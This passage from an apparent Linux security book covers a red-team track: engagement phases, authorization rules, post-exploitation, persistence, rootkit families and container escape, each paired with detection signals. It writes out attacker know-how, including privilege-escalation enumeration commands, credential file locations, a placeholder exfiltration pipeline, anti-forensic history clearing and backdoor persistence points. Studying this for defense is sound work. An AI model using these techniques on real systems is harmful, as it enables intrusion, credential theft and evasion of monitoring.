- **Linux Kernel Programming** (Billimoria), **Linux Kernel Development** (Love), **Understanding the Linux Kernel** (Bovet/Cesati)

### 7. Reverse Engineering Practice

To read exploits and malware fluently:

- **Ghidra** (free, NSA-released): full RE workstation
- **radare2 / rizin / Cutter**: open RE stack
- **Binary Ninja, IDA**: commercial, well documented
- **crackmes.one**: practice binaries

### 8. Detection Engineering Practice

The other half of DevSecOps is detection. Practice:

- write a Falco or Tetragon rule for a specific behavior
- write a YARA rule and validate it on benign and malicious samples
- build a small ELK or Loki stack and stream syslog and audit logs into it
- replay a public attack PCAP and see what your detectors catch
- read a published incident report (Mandiant, CrowdStrike, Volexity) and extract three detections you would have wanted

### 9. A Suggested Weekly Cadence

A self-paced rhythm that works for many engineers:

- one hour on a practice exercise (CTF, lab, kernel build)
- one hour of reading a primary source (LWN, kernel patch series, advisory writeup)
- thirty minutes writing notes in your own words
- thirty minutes implementing or extending a small tool

Skill in this domain compounds. Six months of consistent low-volume practice will out-perform a one-week intensive every time.

## Part 32: Reading List And Reference Material

**Level: All levels.** A reference chapter; treat it as a menu, not a course.

A curated, defensively-minded reading list. None of these require commercial access.

### Books

- Kaiwan N. Billimoria, *Linux Kernel Programming*, Packt, 2nd ed., 2024 — the companion text for this guide
- Robert Love, *Linux Kernel Development*, 3rd ed.
- Daniel P. Bovet and Marco Cesati, *Understanding the Linux Kernel*, 3rd ed.
- Wolfgang Mauerer, *Professional Linux Kernel Architecture*
- Jonathan Corbet et al., *Linux Device Drivers*, 3rd ed. (free online)
- Liz Rice, *Container Security* and *Learning eBPF*
- Andrii Nakryiko (and contributors), libbpf documentation and examples
- Brendan Gregg, *Systems Performance* and *BPF Performance Tools*
- Bratus et al., *The Art of Software Security Assessment*
- Anley et al., *The Shellcoder's Handbook*, 2nd ed.
- Chris Anley, *Practical Linux Forensics* — for incident response perspective
- Michael Sikorski and Andrew Honig, *Practical Malware Analysis*

### Online References

- **kernel.org documentation** (`Documentation/` in the kernel tree)
- **LWN.net** — the single best running source on Linux kernel topics
- **The Linux Kernel Module Programming Guide** (TLDP)
- **The Linux Programming Interface** (Kerrisk) reference site
- **man7.org** — Michael Kerrisk's man pages
- **bootlin's elixir kernel cross-referencer**

### Security Blogs And Advisories

- **Project Zero** (Google) — long-form, technical, frequently kernel
- **Grsecurity blog** — strong opinions on kernel hardening
- **a13xp0p0v** ("Linux Kernel Defense Map") — visualization of kernel mitigations
- **xairy** — kernel exploitation resource lists
- **Phrack** archives — historical exploitation
- **PaX Team**, **spender** writings — historical kernel hardening
- **Andrey Konovalov** — kernel fuzzing and exploitation writeups
- **bluefrostsec, Sergey Glazunov, oss-sec mailing list**

### Conferences And Talks

- **Linux Plumbers Conference** — kernel-developer-focused, recordings online
- **Kernel Recipes**
- **Linux Security Summit**
- **Black Hat / DEF CON / OffensiveCon / Recon** — exploitation-heavy
- **Linux Foundation eBPF Summit** — eBPF-specific
- **CloudNativeCon (KubeCon) security track** — runtime security in containers

### Mailing Lists And RSS Worth Watching

- **lkml.org** — the kernel mailing list. Skim weekly summaries, do not try to read everything.
- **linux-distros**, **oss-security** — embargoed and public security advisories
- **stable@vger.kernel.org** announcements for stable kernel releases

## Red Team Track Overview (Parts 33–47)

The next fifteen Parts form a coherent track for readers who want to do red-team or adversary-emulation work on Linux platforms. They reuse the kernel, exploitation, and eBPF foundations from earlier in the book, and are framed defensively: each technique is paired with its detection footprint, the assumption being that good red teamers and good blue teamers reason about the same artifacts.

This track does not contain weaponized code. It teaches the *shape* of attacker activity so that you can plan engagements, write detections, and read advisories fluently.

If you have not read Parts 0 through 14, do that first. The Red Team Track will move very fast through ideas you should already have a model for.

## Part 33: Engagement Lifecycle On Linux (Red Team Track)

**Level: Intermediate.** A map of the phases of a real engagement. Each phase points back into earlier Parts that explain the underlying mechanism.

**Beginner sidebar.** The "kill chain" or "attack lifecycle" is the standard mental model for how an attack unfolds over time. Different frameworks (Lockheed Kill Chain, MITRE ATT&CK, Unified Kill Chain) carve up the phases differently. The phases here are the practical ones a red-team operator on Linux actually moves through.

### 1. The Phases

A typical Linux red-team engagement passes through these phases. Each one has its own goals, observable signals, and tradeoffs.

```text
recon  ->  initial access  ->  foothold  ->  enumeration
                                                  |
                                                  v
exfil  <-  collection   <-   lateral move  <-  privilege escalation
   |                                              |
   v                                              v
cleanup    <-----  persistence (placed throughout)
   |
   v
reporting
```

### 2. Reconnaissance

External reconnaissance gathers information without (yet) touching the target meaningfully:

- DNS, certificate transparency logs, search engines, Shodan/Censys
- public source code, GitHub issues, container registries, Helm charts
- employee social media, leaked credentials in old breaches
- HTTP fingerprinting once an asset is identified

Defensive footprint:

- mostly invisible to the target
- only the active probing leaves logs (DNS queries, HTTP requests, port scans)
- this is where MiLog's `milog probes` and `milog exploits` (Part 18) start picking up signal

### 3. Initial Access

The first foothold often comes from one of these classes:

- credential reuse from a public breach
- exposed service with a known vulnerability
- web application bug (SSRF, deserialization, auth bypass) — see Part 41 for the C2 channels these end up using
- phishing leading to a developer's workstation, then to their credentials or VPN
- supply chain — see Part 40

Defensive footprint:

- access logs show the first request that worked
- a process appears that should not be there (web worker spawning a shell — Part 18 detects this exact pattern)
- a session originates from an unusual ASN or geography

### 4. Foothold And Situational Awareness

Once code runs, the attacker wants to know what they have without making noise:

- which user are they? (`id`, `whoami`)
- which kernel? (`uname -a`)
- which distro? (`/etc/os-release`)
- which capabilities? (`getcap`, `cat /proc/self/status`)
- containerized? (`/proc/1/cgroup`, `ls /.dockerenv`, `/proc/self/mountinfo`)
- network reachability (`ip a`, `ss -tunlp`, `cat /etc/resolv.conf`)
- what tooling is installed? (`which python3 nc curl wget`)

Defensive footprint:

- this is the noisiest phase if not done carefully — every command is logged by audit and eBPF detectors
- mature red-team operators batch their commands into a single short script and minimize shell history footprint
- detection tools like Tetragon, Tracee, and Falco specialize in this phase

### 5. Privilege Escalation

The full taxonomy is in Part 35. At this stage, the attacker is choosing between:

- userland privesc (sudo misconfig, SUID binary bug, capability misuse)
- kernel privesc (a CVE that gives root from a regular user)
- container escape (Part 38) if the foothold is inside a container
- credential reuse from environment variables, mounted secrets, or memory

Defensive footprint:

- transitions in UID, GID, or `cred` (Part 29) are high-signal
- module load events, BPF program loads, and unusual mount syscalls are high-signal
- many escalation paths leave behind a writable file in a privileged location

### 6. Persistence

Persistence is treated as its own taxonomy in Part 36. Operators usually place persistence early (right after foothold) and then again at higher privilege levels.

The OPSEC tradeoff is constant: more persistence means more chances to be detected, but losing access has a high re-entry cost.

### 7. Lateral Movement

On Linux, lateral movement is usually one of:

- SSH with stolen keys or passwords
- credentials reused across accounts
- service-to-service via Kubernetes service accounts (Part 39) or cloud IAM (Part 40)
- internal HTTP or RPC services that trust the network
- pivoting through tunnels (Part 41)

Defensive footprint:

- new SSH key on a sensitive account (MiLog accounts audit catches this)
- new outbound connection to an internal asset that did not previously talk to this host
- new listening port for a tunnel

### 8. Collection And Exfiltration

What the engagement was actually for. Common shapes on Linux:

- archive the target directory (`tar czf - /data | encrypt | exfil`)
- dump credentials and tokens from memory and config files
- read logs and database snapshots
- copy build artifacts or source

Detection: large outbound flows to non-standard destinations, new compression activity in unusual paths, unusual reads of sensitive files.

### 9. Cleanup

Mature operators remove what they can without damaging the host:

- shell history files (`~/.bash_history`, `~/.zsh_history`) — but note that `HISTFILE=` and `unset HISTFILE` leave their own signal
- temporary tools dropped to `/tmp`, `/dev/shm`, `/var/tmp`
- audit log entries when possible (which often requires root and tends to be heavily monitored)

Detection: log gaps, anti-forensic behavior, missing files where there should be evidence.

### 10. Reporting

The output of a real engagement is a written report. A good report documents:

- the timeline of compromise
- each technique used, mapped to MITRE ATT&CK (Part 44)
- detection gaps the blue team should close
- prioritized remediation
- evidence that supports each finding

This is also why "ethical" and "professional" are not soft words in this work. Reports drive remediation. Sloppy reports cause real harm.

### 11. The Phase Map As Detection Map

For blue teams reading this Part, every phase is a detection opportunity. The earlier you catch the engagement, the cheaper the response. The book has covered the detection layers at each phase:

- recon: Part 18 (log heuristics)
- initial access: Parts 18, 19
- foothold: Parts 14, 18, 30 (eBPF)
- privesc: Parts 9, 15, 29
- persistence: Parts 18, 36
- lateral: Parts 18, 39
- exfil: Parts 18, 19
- cleanup: Part 18 (drift)

That is the full case for combining application-edge logs, host drift, and runtime telemetry: each one catches a different phase.

## Part 34: Rules Of Engagement, Authorization, And OPSEC

**Level: Beginner → Intermediate.** Short, but read it before any of the technique chapters.

The most important skill in red-team work is not technical. It is staying within authorization. This Part is a checklist, not a legal document.

### 1. Authorization Is The Whole Game

Every technique in this track is illegal without permission. The line between "security researcher" and "criminal" is paperwork. Make sure yours is current, in writing, and signed by someone who can actually authorize it.

Minimum authorization checklist before any engagement:

- written statement of work signed by an authorized stakeholder
- explicit scope: in-scope IP ranges, hostnames, applications, accounts
- explicit out-of-scope items
- engagement window (start and end dates and times)
- emergency contact with a 24/7 channel
- escalation procedure if something breaks production
- handling of any data found (especially PII or regulated data)
- handling of credentials discovered (rotated by client, not kept)

If anything is unclear, do not proceed. Ask in writing and wait for a written answer.

### 2. Scope Discipline

Scope creep is the most common way engagements go wrong. Even if a system *looks* in scope, if it is not on the list, do not touch it. Ambiguity should always resolve in favor of stopping and asking.

Common scope traps:

- shared infrastructure where a misstep affects other tenants
- third-party SaaS that your client uses but does not own
- production data that is in scope but should not be exfiltrated
- backup systems
- monitoring and alerting infrastructure (do not "test" it without explicit permission)

### 3. Bug Bounty Versus Red Team Versus Pentest

These have different rules. Know which you are operating under.

- **Bug bounty**: programmatic, rules in the program brief, usually no human in the loop, narrow scope, no post-exploitation expected
- **Pentest**: time-boxed, scoped, often white-box, deliverable is a report
- **Red team**: longer, often black-box, simulates a real adversary, often includes social engineering and physical, deliverables include detection feedback
- **Adversary emulation**: red team that emulates a *specific* threat actor's TTPs (often used to test detection coverage against a named group)

A technique that is fine in a red-team engagement may be out of scope in a bug bounty.

### 4. OPSEC In Authorized Engagements

Even with authorization, attacker-style OPSEC matters because the engagement is more useful when it tests detection realistically.

Practical OPSEC concepts:

- **Logging awareness**: every command, syscall, and packet leaves something. Know what.
- **Tool selection**: a noisy tool wakes up detectors that quieter tools would not.
- **Living off the land**: using built-in binaries (`bash`, `python3`, `curl`) tends to blend in better than custom tools, but mature defenders detect this too.
- **Time-of-day**: business hours look different from 3 AM.
- **Source IP and identity hygiene**: from where do you operate? Through what jump host? Whose account?
- **Crash and core-dump awareness**: a crashed exploit leaves a `core` file that contains your tooling.

### 5. Detection-First Red Team

Modern red teams measure success in detection signal as much as in compromised assets. The questions to answer:

- which detections fired? at what time?
- which detections should have fired and did not?
- how long between attacker action and analyst awareness?
- what data did the analyst have to work with?

This is also the basis of *purple-team* exercises, where red and blue teams work together in real time.

### 6. Data Handling And Reporting

Anything you exfiltrate to prove a point is sensitive data the client did not give you permission to keep. Standard practice:

- store engagement data on encrypted volumes
- never copy off engagement data to personal devices
- destroy after the report is delivered (with documented procedure)
- report immediately if you find evidence of an *actual* third-party intrusion

### 7. Legal And Cross-Border Considerations

If the target's infrastructure crosses jurisdictions, so does the engagement. Cloud providers, CDNs, and SaaS vendors live in many countries. Talk to legal before crossing borders, before touching critical infrastructure, and before any technique that *could* be construed as harm.

### 8. The Single Rule

If a sentence summarizes this Part, it is:

```text
when in doubt, stop and ask.
```

Authorization, scope, and OPSEC are non-negotiable. The technical material in the next Parts is only useful when wrapped in those constraints.

## Part 35: Linux Post-Exploitation Playbook

**Level: Intermediate → Advanced.** A taxonomy of what attackers do *after* initial access. Each item has a detection signal in the right column of your mental model — Part 18's drift and runtime signals catch many of these.

**Beginner sidebar.** Post-exploitation is the largest body of work in real engagements, and it is where defenders have the most chances to catch problems. Learning the *patterns* here makes you better at both sides at once.

### 1. The Three Privesc Questions

Once a foothold exists, the operator's first three questions are almost always:

1. What can my current user already do that I have not used?
2. Are there local-root paths that do not require a kernel exploit?
3. If not, is there a kernel-level path?

Order matters. Userland privesc is quieter than kernel privesc. Kernel privesc is a last resort because it is loud and can crash the host.

### 2. Userland Privesc Surfaces

Common patterns to enumerate:

- **sudo misconfiguration**: `sudo -l` reveals what your user can run. `NOPASSWD` rules, command whitelists with shell escapes, and `env_keep` mistakes are recurring findings.
- **SUID/SGID binaries**: `find / -perm -4000 -type f 2>/dev/null` lists them. The classic abuse is when an SUID binary executes a sub-program in a way the attacker can influence (PATH, LD_PRELOAD on non-`AT_SECURE` binaries, environment variables).
- **File capabilities**: `getcap -r / 2>/dev/null` finds binaries with file capabilities. `cap_setuid+ep` on a scripting language is effectively root.
- **Writable system paths**: writable `/etc/cron.d/`, `/etc/sudoers.d/`, systemd unit directories, `/usr/local/bin`, or any directory in root's `PATH`.
- **Misowned services**: services running as root that read attacker-writable config files.
- **Group memberships**: `docker`, `lxd`, `disk`, `video` (sometimes), `kvm`, and `wheel` (depending on distro) often grant trivial root paths.
- **NFS / shared filesystems with `no_root_squash`**: a remote root can place SUID binaries that the local victim runs.
- **`PATH` injection**: services that run scripts without absolute paths can be hijacked by writing a binary earlier in the PATH.

### 3. Tools That Automate The Enumeration

Two open-source tool families dominate the privesc enumeration space. Read their source — both teach you the surface better than any blog post.

- **PEASS-ng** (`linpeas.sh`): comprehensive Bash script that enumerates the surfaces above and color-codes findings.
- **linux-exploit-suggester** / **linux-exploit-suggester-2**: maps current kernel version and config to known kernel CVEs.
- **GTFOBins** (gtfobins.github.io): a catalog of how individual Unix binaries can be abused when granted SUID, sudo, capabilities, or similar. This is the reference for "I have sudo access to `vim`, what now?"

Detection: these tools are noisy. They read hundreds of `/proc` and `/etc` files, list every binary on the filesystem, and run dozens of commands. eBPF tools see this clearly as a process burst.

### 4. Kernel Privesc Paths

Covered in Parts 8, 9, 12, and 29. From a post-exploitation point of view:

- pick a kernel CVE that matches the running kernel
- check whether mitigations (SMEP, SMAP, KPTI, lockdown, `kernel.unprivileged_bpf_disabled`) reduce reliability
- weigh against the noise the exploit will generate
- have a non-kernel fallback ready

A red-team operator usually prefers userland privesc when available. A kernel exploit is fingerprint-rich and may crash the host.

### 5. Credential Harvesting Surfaces

Linux hosts hold credentials in many places. The taxonomy:

- **At rest in files**:
  - `~/.bash_history`, `~/.zsh_history`, `~/.python_history`, `~/.psql_history`, `~/.mysql_history`
  - `~/.aws/credentials`, `~/.config/gcloud/`, `~/.azure/`
  - `~/.docker/config.json`, `~/.kube/config`
  - `~/.netrc`, `~/.git-credentials`
  - SSH private keys in `~/.ssh/`
  - environment files: `.env`, `docker-compose.yml`, Helm values
  - service config: `/etc/mysql/`, application config under `/opt/`, `/srv/`
  - cron job environment files
- **In memory**:
  - process memory of services that hold tokens (look at `/proc/<pid>/environ` for env vars; readable when the process owner matches)
  - SSH agent socket (`SSH_AUTH_SOCK`) lets you use loaded keys without exfiltrating them
  - tmux/screen sockets for in-progress shells
  - GNOME keyring, KDE wallet, libsecret backed stores
- **Mounted secret stores**:
  - `/var/run/secrets/kubernetes.io/serviceaccount/token` inside a Kubernetes pod (Part 39)
  - cloud instance metadata (Part 40)
  - HashiCorp Vault agent caches
  - mounted Docker secret files
- **Through other services**:
  - LDAP / FreeIPA if the host is joined
  - Kerberos tickets (`klist`, `/tmp/krb5cc_*`)

Tools to know by name (not how-to): `mimipenguin`, `LaZagne`, `truffleHog`, `gitleaks`.

Detection: any read of these paths from an unexpected user, any read of another user's `/proc/<pid>/environ`, any new SSH key registration (MiLog accounts audit), any access to `/var/run/secrets/...` from an unexpected pod.

### 6. SSH Key And Authentication Abuse

A surprising amount of Linux post-exploitation comes down to SSH:

- compromising a developer machine and reading their private keys
- adding an attacker key to `~/.ssh/authorized_keys` (persistence — Part 36)
- using `ssh-agent` forwarding from a compromised host
- abusing trust relationships in `~/.ssh/config` (`ProxyJump`, `Include`)
- abusing host-based authentication (`/etc/ssh/shosts.equiv`)

A common mistake on the defensive side is to trust SSH login logs and not also watch *what* the SSH session does inside the host.

### 7. Token And Service-Account Reuse

Beyond user credentials, modern Linux holds many service tokens:

- Kubernetes service account JWTs (Part 39)
- cloud IAM tokens from instance metadata (Part 40)
- CI/CD job tokens, often in environment variables
- OIDC tokens cached by `gcloud`, `aws`, `kubectl`, etc.
- Docker registry tokens

A useful framing: "credentials" are no longer just usernames and passwords. They are JWTs, OIDC tokens, signed cloud requests, and cached identity material — and they often live in unexpected places.

### 8. Evidence Cleanup And Anti-Forensics

Mature operators reduce the artifacts they leave. Common patterns:

- redirect to /dev/null or set HISTFILE empty before commands that should not be logged
- delete (or do not write) shell history
- delete dropped tools after use
- timestomp (`touch -r reference target`) when matching mtimes matters
- `rm -P` or `shred` on sensitive files (effectiveness depends on filesystem)
- on Linux, the `auditd` log is a high-value target — root access is required to manipulate it, and tampering is itself a strong signal

What does *not* work well:

- "secure delete" tools on copy-on-write filesystems
- removing yourself from `wtmp`/`utmp`/`btmp` is detectable as anomalous file edits
- clearing journald is logged

Detection: the *absence* of expected logs is itself a signal. Drift detection (Part 18) catches surprising file deletions in tracked directories.

### 9. Operational Hygiene For Authorized Engagements

Even when authorized, leave the environment clean:

- track every artifact you place on a host so the report can list and remediate them
- prefer ephemeral memory-only execution when possible to minimize cleanup burden
- restore any files you modified (have a backup before you change `authorized_keys`, etc.)
- on container hosts, prefer running tooling inside ephemeral containers that vanish on engagement end

## Part 36: Persistence Taxonomy On Linux

**Level: Intermediate.** A complete map of where attackers hide re-entry points on a Linux system. Each entry pairs with the detection signal it produces. Use this Part as a checklist for both sides.

### 1. Why Persistence Matters

Initial access is rare and expensive. Once an operator has it, losing it is costly. Persistence is the set of techniques to survive reboots, log-outs, kicked sessions, password changes, and incident-response cleanup that is not thorough.

Defensively, persistence is the easiest *family* of attacker activity to catch with baseline-and-drift tooling like the MiLog accounts/persistence audits (Part 18.7).

### 2. Categories Of Persistence

A useful taxonomy:

```text
user-level     - lives in a user's home dir / session, no special privilege needed
service-level  - hooks into init or service manager, often requires root
kernel-level   - lives in the kernel itself (modules, eBPF rootkits) — see Part 37
firmware-level - below the OS (UEFI, BMC) — see Part 46
external       - lives off-host (cloud account, IAM trust, registry image)
```

Each category has different stealth and different detection requirements.

### 3. User-Level Persistence

Most subtle, often does not require root.

- **`~/.bashrc`, `~/.zshrc`, `~/.bash_profile`, `~/.profile`** — runs every interactive shell. Easy to add, easy to detect with file integrity monitoring on home directories.
- **`~/.ssh/authorized_keys`** — adding a public key gives indefinite SSH access. MiLog's accounts audit watches this exactly.
- **`~/.ssh/config`** with `ProxyCommand` — runs an arbitrary command when the user SSHs out.
- **User crontab** — `crontab -e` adds entries that run as the user.
- **User-level systemd units** — `~/.config/systemd/user/`. Run when the user is logged in (or with lingering enabled, always).
- **Desktop autostart** — `~/.config/autostart/*.desktop`. Workstation-specific.
- **Shell aliases and functions** — slow-burn redirection of commands.
- **Per-user `LD_PRELOAD`** — adding to `~/.pam_environment` or shell rc.

Detection: drift detection on home directories, monitoring for new files in any of these well-known paths.

### 4. Service-Level Persistence (System-Wide)

Requires root or capability-equivalent.

- **systemd unit drops** in `/etc/systemd/system/`, `/usr/lib/systemd/system/`, `/run/systemd/system/`. A unit can run on boot, on a timer, on a path event, or as a generator.
- **Cron drops** in `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/crontab`.
- **Init scripts** in `/etc/init.d/` (still relevant on some distros).
- **`/etc/rc.local`** — runs at boot on systems that still use it.
- **PAM modules** — `/etc/pam.d/` configuration plus a custom `.so` in `/lib/security/` can intercept every authentication attempt.
- **NSS modules** — `/etc/nsswitch.conf` plus a custom `.so` can intercept every name resolution.
- **Wrapper script around a system binary** — replace `/usr/sbin/sshd` with a wrapper that calls the real binary.
- **`/etc/ld.so.preload`** — system-wide library preload. Detected by both rootkit heuristics (MiLog 18.9) and any FIM tool.
- **Custom keyring entries**, **udev rules** in `/etc/udev/rules.d/` that trigger on device events, **dbus services** that run on demand.

Detection: persistence audits (MiLog 18.7) snapshot these directories and alert on `APPEARED`. Many of the entries are also covered by built-in distro integrity tools (rpm, dpkg, debsums).

### 5. Container-Level Persistence

If the foothold is in a container that gets recreated, the persistence has to survive:

- modifying the container *image* (write into the layer that gets pushed) — Part 38
- modifying a Helm chart, Kubernetes Deployment, or DaemonSet — Part 39
- modifying init or entrypoint scripts that the orchestrator runs
- abusing a `CronJob` to land a fresh container regularly
- adding a sidecar that re-implants the foothold

Detection: monitoring image registries for unexpected pushes, monitoring K8s resource changes (audit logs), runtime detection of unexpected processes inside containers.

### 6. Authentication-Layer Persistence

Particularly subtle because it survives many cleanup attempts:

- adding an entry to `/etc/passwd` or `/etc/shadow`
- adding a user to `/etc/sudoers` or dropping a file in `/etc/sudoers.d/`
- adding an SSH host CA that signs attacker keys
- modifying `pam_unix` configuration to accept a backdoor password
- adding an Authorized Keys command (`AuthorizedKeysCommand`) that always returns an attacker key
- LDAP / SSSD additions if the host is domain-joined

Detection: MiLog accounts audit (Part 18.5) catches `/etc/passwd`, `/etc/sudoers`, `authorized_keys`. PAM and SSHD config drift is critical to monitor.

### 7. Kernel- And Module-Level Persistence

See Part 37 for the malware/rootkit families. From a persistence perspective:

- a loaded kernel module (`insmod`, `modprobe`) is the classic kernel persistence
- modprobe blacklists or aliases (`/etc/modprobe.d/`) can replace expected modules
- eBPF programs pinned to bpffs (`/sys/fs/bpf/`) survive the loader process exiting; with auto-attach scripts they can reload at boot

Detection: `lsmod`, `kmod list`, `bpftool prog list`, drift on `/etc/modules*` and `/etc/modprobe.d/`.

### 8. External Persistence (Off-Host)

If the engagement scope includes the broader environment:

- a cloud IAM role with attacker access (Part 40)
- a backdoored container image in a private registry
- a malicious GitHub Action or CI step (Part 40)
- a long-lived OIDC token cached on a developer workstation
- an attacker SSH key on a CI runner that re-deploys the host

Detection: this is detected outside the host, in the cloud control plane and CI audit logs.

### 9. Choosing Where To Persist

A red-team operator weighs:

- **stealth**: how unique is this artifact to my activity?
- **survivability**: does it survive reboot? OS update? container rebuild?
- **trigger control**: when does it activate? Can the defender starve it by changing behavior?
- **detection footprint**: which audits will probably catch it?

A common pattern is to layer persistence: one quiet, hard-to-find entry; one slightly noisier fallback; one external (cloud or registry) safety net.

### 10. Defensive Counter-Persistence

For blue teams reading this Part, persistence is the friendliest attacker activity to detect because it lives on disk and changes the host's known state:

- baseline + drift on every directory listed above
- file integrity monitoring with line-level diffs on auth files (Part 18.5)
- registry and CI audit on the off-host side
- regular `lsmod` / `bpftool prog` audits on critical hosts
- run integrity-checking tools (`debsums`, `rpm -V`, `aide`) on a regular schedule

If you do all of these, most non-kernel persistence loses its value because the operator cannot keep it long enough to be useful.

## Part 37: Linux Malware And Rootkit Families

**Level: Advanced.** A taxonomy of how Linux malware actually hides. Useful for both red and blue: the red team learns what is *possible*, the blue team learns what to look for.

**Beginner sidebar.** A *rootkit* is software that hides its own presence and gives an attacker continued access. The interesting question is not "is this malicious?" but "where in the system does it live, and what does it have to lie about to stay hidden?"

### 1. The Hiding Problem

Malware authors face one core problem: they have to interact with the operating system to do their work, and that interaction tends to be visible. The rootkit families below differ mostly in *where* they intercept information so that a defender's view becomes wrong.

### 2. Userspace Rootkits Via `LD_PRELOAD`

The simplest family. The dynamic linker loads libraries listed in `LD_PRELOAD` (per-process) or `/etc/ld.so.preload` (system-wide) before any other library. A preloaded library can override any libc function.

What it can hide:

- intercept `readdir` to hide files from `ls`
- intercept `read` on `/proc/<pid>/...` to hide processes
- intercept `accept` and `connect` to hide network activity
- intercept `unlink`, `open` to protect itself from deletion

Famous public examples (study, do not run): Jynx, Azazel, Vlany, Bedevil.

Detection footprint:

- `/etc/ld.so.preload` exists or is non-empty (Part 18.9 rootkit heuristic)
- preloaded library is visible in `/proc/<pid>/maps`
- statically linked tools see the truth (e.g., `busybox` static, `lsof` from a known-good binary)
- `LD_PRELOAD` is ignored for `AT_SECURE` binaries (setuid, capabilities) — this is why setuid privesc is sometimes immune

This family is the easiest to catch and easiest to write. It is also still common in commodity malware.

### 3. Kernel Module Rootkits (LKM)

A loaded kernel module can hook syscall tables, VFS operations, or netfilter, and lie at a layer no userspace tool can see through.

What it can hide:

- everything `LD_PRELOAD` can, but without ever touching userspace
- kernel-resident persistence
- rootkit modules can hide themselves from `lsmod` by unlinking from the module list

Famous public examples: Diamorphine, Reptile, Suterusu, KoviD.

Detection footprint:

- module load events (Part 14, Part 15) are high-signal — Cornela watches for these explicitly
- `kernel.modules_disabled=1` after boot prevents this entirely
- secure boot + module signing prevents loading unsigned modules
- a hidden module still has `struct module` somewhere; forensic tools can find it
- `/proc/kallsyms`, `/proc/modules`, and `/sys/module/` should agree; disagreement is itself a signal

This family is harder to write than `LD_PRELOAD` but much harder to detect from userspace alone.

### 4. eBPF Rootkits

A newer family that uses eBPF instead of kernel modules. The attractions for the operator:

- eBPF is verified and JITed, so the program itself is more reliable than handwritten kernel code
- many Linux distributions allow loading BPF without loading modules (if `unprivileged_bpf_disabled` is not set strictly)
- eBPF programs can hook tracepoints and kfuncs to lie about syscalls, network state, and process listings
- eBPF maps can hold attacker state without writing files

Public research projects to *study* (these are research code, written for defenders to learn from):

- **boopkit** — eBPF-based backdoor, demonstrates the technique
- **ebpfkit** — eBPF rootkit framework
- **TripleCross** — Mitre eBPF rootkit research
- **bad-bpf** — collection of malicious eBPF examples
- the published Defcon and BlackHat talks in the Reading List (Part 32)

What it can hide:

- syscall results can be modified before they reach userspace
- network traffic can be hidden by intercepting socket-related hooks
- process hiding via tracepoint hooks on `/proc` reads

Detection footprint:

- `bpftool prog list` shows all loaded BPF programs (until the rootkit hides itself from that too)
- Tetragon and other eBPF-based defenders specifically watch for *unexpected* BPF programs
- `kernel.unprivileged_bpf_disabled=1` plus `CAP_BPF` audit logging helps
- BPF LSM hooks can deny new BPF programs based on signature/path
- the rootkit's own attach activity is loud at load time even if quiet thereafter

This family is the most active research area in Linux malware right now. Understanding it is a core competency for modern blue teams.

### 5. Userspace Process Injection

Linux does not have a "process injection" model as standardized as Windows, but the techniques exist:

- **`ptrace`-based injection**: if `ptrace_scope` permits, attach to a target process and write to its memory
- **`/proc/<pid>/mem` writes**: writing to another process's memory map (limited by `ptrace_scope`)
- **GOT overwrites in another process** via `ptrace`
- **shared library hijacking**: replacing or relinking `.so` files the target uses

Defenses: `kernel.yama.ptrace_scope=2` or `3`, capability and namespace separation, file integrity monitoring on shared libraries.

### 6. Memory-Only Malware

To avoid file-based detection, some malware never writes to disk:

- pulled via `curl | bash` from a one-shot URL
- decrypted into a `tmpfs` or `memfd_create` region
- executed via `execveat(memfd, ...)` with no path on disk
- runs entirely in process memory

Detection signals:

- exec from `memfd:` (visible in `/proc/<pid>/maps` and via eBPF exec tracing)
- network activity for the staging fetch
- the loader process itself (`bash`, `python`, etc.) is still visible

### 7. Container-Aware Malware

Some malware is specifically designed for container hosts:

- enumerates the host through `/proc/1/root/` if mounted
- looks for `/var/run/docker.sock`
- looks for the kubelet's local API
- pivots via Kubernetes service-account tokens

Public examples worth reading about: Kinsing, TeamTNT, Hildegard.

### 8. Practical Detection Strategy

A layered detection model that catches most rootkit families:

1. **boot-time integrity**: secure boot, signed modules, dm-verity for the rootfs where applicable
2. **kernel hardening**: `modules_disabled`, BPF lockdown, `kptr_restrict`, `dmesg_restrict`
3. **on-host runtime**: eBPF agents that watch for module loads, BPF program loads, exec from memfd, exec from `/tmp`
4. **drift**: FIM on system binaries, `/etc/ld.so.preload`, persistence directories
5. **forensic comparison**: periodic comparison of `/proc/kallsyms`, `/proc/modules`, `lsmod`, and any known-good baseline

The lesson is that no single layer is sufficient against a serious rootkit, but the union of layers is hard to evade without leaving signal somewhere.

## Part 38: Container Exploitation And Escape

**Level: Intermediate → Advanced.** A dedicated chapter on container *breakout* — the techniques that turn a container compromise into host or cluster compromise. Builds on Parts 0.8, 3, 13, and 19.

**Beginner sidebar.** A *container escape* is when a process inside a container ends up acting as if it were outside — on the host, with host privileges. Almost every category of escape is really "the container had too much privilege to begin with, or a kernel bug let it cheat."

### 1. The Threat Model

Containers share a kernel with the host. When you compromise a process inside a container, you have:

- the container's filesystem view
- the container's network namespace
- the container's user (often root *inside* the namespace, but mapped to a less-privileged ID on the host if user namespaces are in use)
- whatever capabilities, seccomp, AppArmor/SELinux, and mounts the container has

A breakout is anything that escapes those bounds. The taxonomy below is by *class of weakness*, because the same class produces many CVEs.

### 2. Misconfiguration Class: Privileged Containers

`docker run --privileged` (or the equivalent K8s `securityContext.privileged: true`) disables most isolation. The container has all capabilities, sees all devices, and has an effectively unrestricted view.

If you find this in scope, the breakout reduces to "use the privilege you were handed":

- mount the host root device that is now visible (`/dev/sda1`, etc.)
- load a kernel module
- write to `/sys/...` or `/proc/sys/...` to change host-wide settings
- use `nsenter` against PID 1 of the host (visible because PID namespace is shared in some setups)

Detection: the *fact* of a privileged container is the finding. Cornela's audit (Part 15) flags this.

### 3. Misconfiguration Class: Dangerous Capabilities

`CAP_SYS_ADMIN` is famously close to root. Other capabilities have specific breakout paths:

- **`CAP_SYS_ADMIN`**: many — mount, namespace, BPF in some kernels
- **`CAP_SYS_MODULE`**: load arbitrary kernel modules — full host compromise
- **`CAP_SYS_PTRACE`**: trace processes; combined with shared PID namespace this means tracing host processes
- **`CAP_DAC_READ_SEARCH`**: read any file the kernel allows; combined with `open_by_handle_at` this has produced container escapes
- **`CAP_NET_RAW`**: raw sockets, useful for ARP/DNS poisoning on the container network
- **`CAP_NET_ADMIN`**: change networking; can attach BPF to network paths in some setups
- **`CAP_BPF`** + **`CAP_PERFMON`**: load BPF programs

Detection: Cornela audits container capabilities; Kubernetes `PodSecurityContext` review catches this at admission.

### 4. Misconfiguration Class: Dangerous Mounts

What is mounted into a container can be more dangerous than capabilities.

